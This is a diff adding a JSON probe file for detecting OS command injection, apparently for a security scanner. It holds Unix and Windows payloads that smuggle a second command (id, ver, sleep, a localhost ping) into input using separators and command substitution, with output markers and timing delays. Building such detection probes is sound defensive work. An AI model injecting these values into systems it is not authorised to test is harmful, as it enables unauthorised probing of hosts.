@@ -1,0 +1,101 @@
+{
+  "meta": {
+    "description": "OS command-injection probes. Every payload runs a read-only, non-destructive command only (id/whoami/ver/sleep/ping) — never a write, delete, or state-changing action — so confirming the class still requires no destructive side effect on the target.",
+    "safe": true
+  },
+  "output_probes": [
+    {
+      "id": "cmdi_unix_id_semicolon",
+      "os": "unix",
+      "value": "; id",
+      "markers": ["uid=\\d+", "gid=\\d+"],
+      "description": "Statement separator + id — reveals the invoking user/group if the shell runs it."
+    },
+    {
+      "id": "cmdi_unix_id_pipe",
+      "os": "unix",
+      "value": "| id",
+      "markers": ["uid=\\d+", "gid=\\d+"],
+      "description": "Pipe operator + id."
+    },
+    {
+      "id": "cmdi_unix_id_and",
+      "os": "unix",
+      "value": "&& id",
+      "markers": ["uid=\\d+", "gid=\\d+"],
+      "description": "Logical-AND chain + id."
+    },
+    {
+      "id": "cmdi_unix_id_backtick",
+      "os": "unix",
+      "value": "`id`",
+      "markers": ["uid=\\d+", "gid=\\d+"],
+      "description": "Backtick command substitution + id."
+    },
+    {
+      "id": "cmdi_unix_id_dollar",
+      "os": "unix",
+      "value": "$(id)",
+      "markers": ["uid=\\d+", "gid=\\d+"],
+      "description": "$() command substitution + id."
+    },
+    {
+      "id": "cmdi_windows_ver_amp",
+      "os": "windows",
+      "value": "& ver",
+      "markers": ["Microsoft Windows \\[Version"],
+      "description": "Ampersand chain + ver — reveals the Windows version banner."
+    },
+    {
+      "id": "cmdi_windows_ver_pipe",
+      "os": "windows",
+      "value": "| ver",
+      "markers": ["Microsoft Windows \\[Version"],
+      "description": "Pipe operator + ver (cmd.exe)."
+    }
+  ],
+  "time_based_probes": [
+    {
+      "id": "cmdi_time_unix_semicolon",
+      "os": "unix",
+      "value": "; sleep 4",
+      "delay_seconds": 4,
+      "description": "Statement separator + sleep — reliable blind-injection timing oracle on *nix shells."
+    },
+    {
+      "id": "cmdi_time_unix_and",
+      "os": "unix",
+      "value": "&& sleep 4",
+      "delay_seconds": 4,
+      "description": "Logical-AND chain + sleep."
+    },
+    {
+      "id": "cmdi_time_unix_pipe",
+      "os": "unix",
+      "value": "| sleep 4",
+      "delay_seconds": 4,
+      "description": "Pipe operator + sleep."
+    },
+    {
+      "id": "cmdi_time_unix_backtick",
+      "os": "unix",
+      "value": "`sleep 4`",
+      "delay_seconds": 4,
+      "description": "Backtick command substitution + sleep."
+    },
+    {
+      "id": "cmdi_time_unix_dollar",
+      "os": "unix",
+      "value": "$(sleep 4)",
+      "delay_seconds": 4,
+      "description": "$() command substitution + sleep."
+    },
+    {
+      "id": "cmdi_time_windows_ping",
+      "os": "windows",
+      "value": "& ping -n 5 127.0.0.1",
+      "delay_seconds": 4,
+      "description": "Ampersand chain + ping — cmd.exe has no native sleep, so delay is induced via ICMP round-trips."
+    }
+  ]
+}
